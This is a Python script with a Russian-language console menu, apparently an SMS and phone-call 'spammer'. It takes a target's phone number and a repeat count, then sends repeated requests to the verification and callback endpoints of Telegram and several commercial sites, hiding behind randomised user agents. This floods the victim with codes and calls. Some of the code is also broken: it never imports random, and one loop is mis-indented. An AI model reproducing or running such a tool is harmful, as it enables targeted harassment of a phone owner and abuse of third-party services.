# Version 1.0
import requests
import fake_useragent
import time
import os
import threading
from threading import Thread
from rich.console import Console
from rich.progress import *

console = Console()

os.system('cls' if os.name == 'nt' else 'clear')


def generate_info():
    global _name
    global _email
    global password
    global username
    global junker_phone
    _name = ''
    password = ''
    username = ''
    for x in range(12):
        _name = _name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
        password = _name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
        username = _name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
    _email = _name + '@gmail.com'
    email = _email


console.print('''[bold red]
 -----------------------------------------
| Создатель - Hironotori                  |
| Telegram - @Hironotori                  |
| Человек которий сильно помог - @GGClubbb|
 -----------------------------------------
''')
conut = console.input('[cyan]Выберите вашу страну:\n[red][1] - Украина\n[2] - Россия\n[blue]spammer>> ')

console.print("[purple]Введите номер телефонa (без +): ")

number = console.input("[blue]spammer>> ")

run = int(console.input('[green]Введите количество повторов (1-10):\n[blue]spammer>> '))

def ukr():
        for _ in track(range(run)):
                headers = {"User-Agent": fake_useragent.UserAgent().random}
                try:
                        requests.post("https://my.telegram.org/auth/send_password", data={"phone": "+" + number}, headers=headers)
                except:
                        pass
                try:
                        requests.post("https://md-fashion.com.ua/bpm/validate-contact", data={"phone": "+" + number}, headers=headers)
                except:
                        pass
                try:
                        requests.post("https://md-fashion.com.ua/bpm/validate-contact", data={'phone' : number},  headers=headers)
                except:
                        pass




def russ():
        for _ in track(range(run)):
                headers = {"User-Agent": fake_useragent.UserAgent().random}
        try:
                requests.post("https://sex-shop.ua/bitrix/components/bxmaker/authuserphone.login/ajax.php", data={"parameters": "YToxOntzOjEwOiJDQUNIRV9UWVBFIjtzOjE6IkEiO30=.886837943a18715db75ae7fe96ae97183ca0be0637a0bc22ca3ba8d04e55b81f", "template": ".default.0439327cbb51aa71d187d378db240bf43d3133d2e235a6d74509561d345ec422", "siteId": "s1", "sessid": "48add65add0e6c591d7aae265c20b0db", "method": "sendCode", "phone": "+" + number, "regustration": "Y"}, headers=headers)
                pass
        except:
                pass
        try:
                requests.post("https://telephony.jivosite.com/api/1/sites/900909/widgets/OVHsL3W8hY/clients/17314/telephony/callback", data={"phone": number, "invitation_text": ""}, headers=headers)
                pass
        except:
                pass
        try:
                requests.post("https://api-proxy.choco.kz/user/v2/code", data={"login": number, "client_id": "-5", "dispatch_type": "call"}, headers=headers)
                pass
        except:
                pass


if conut =='1':
        ukr()
elif conut == '2':
        russ()
